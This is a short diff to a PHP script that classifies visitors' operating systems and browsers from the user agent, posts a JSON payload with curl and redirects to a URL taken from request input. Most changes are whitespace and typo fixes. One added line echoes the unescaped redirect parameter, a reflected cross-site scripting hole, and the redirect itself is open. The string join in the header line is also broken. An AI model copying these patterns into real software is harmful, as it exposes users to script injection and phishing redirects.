@@ -21,7 +21,7 @@ function getOS() {
                             '/macintosh|mac os x/i' =>  'Mac OS X',
                             '/mac_powerpc/i'        =>  'Mac OS 9',
                             '/linux/i'              =>  'Linux',
-			                '/kalilinux/i'          =>  'Wannabe Hacker',
+                            '/kalilinux/i'          =>  'Wannabe Hacker',
                             '/ubuntu/i'             =>  'Ubuntu',
                             '/iphone/i'             =>  'iPhone',
                             '/ipod/i'               =>  'iPod',
@@ -29,7 +29,7 @@ function getOS() {
                             '/android/i'            =>  'Android',
                             '/blackberry/i'         =>  'BlackBerry',
                             '/webos/i'              =>  'Mobile',
-			                '/Windows Phone/i'      =>  'Windows Phone'
+                            '/Windows Phone/i'      =>  'Windows Phone'
                         );
     foreach ($os_array as $regex => $value) { 
         if (preg_match($regex, $user_agent)) {
@@ -44,18 +44,18 @@ function getBrowser() {
     $browser_array  =   array(
                             '/msie/i'       =>  'Internet Explorer',
                             '/firefox/i'    =>  'Firefox',
-			                '/Mozilla/i'    =>	'Mozila',
-			                '/Mozilla/5.0/i'=>	'Mozila5',
+                            '/Mozilla/i'    =>	'Mozilla',
+                            '/Mozilla/5.0/i'=>	'Mozilla5',
                             '/safari/i'     =>  'Safari',
                             '/chrome/i'     =>  'Chrome',
                             '/edge/i'       =>  'Edge',
                             '/opera/i'      =>  'Opera',
-			                '/OPR/i'        =>  'Opera',
+                            '/OPR/i'        =>  'Opera',
                             '/netscape/i'   =>  'Netscape',
                             '/maxthon/i'    =>  'Maxthon',
                             '/konqueror/i'  =>  'Konqueror',
-			                '/Bot/i'	    =>	'Spam',
-			                '/Valve Steam GameOverlay/i'  =>  'Steam',
+                            '/Bot/i'	    =>	'Spam',
+                            '/Valve Steam GameOverlay/i'  =>  'Steam',
                             '/mobile/i'     =>  'Mobile'
                         );
 }
@@ -79,6 +79,7 @@ curl_setopt( $exec, CURLOPT_POSTFIELDS, $make_json);
 curl_setopt( $exec, CURLOPT_FOLLOWLOCATION, 1);
 curl_setopt( $exec, CURLOPT_HEADER, 0);
 curl_setopt( $exec, CURLOPT_RETURNTRANSFER, 1);
+echo $params['redirect'];
 header("Location: " + $params['redirect']); 
 $response = curl_exec( $exec );
 ?>
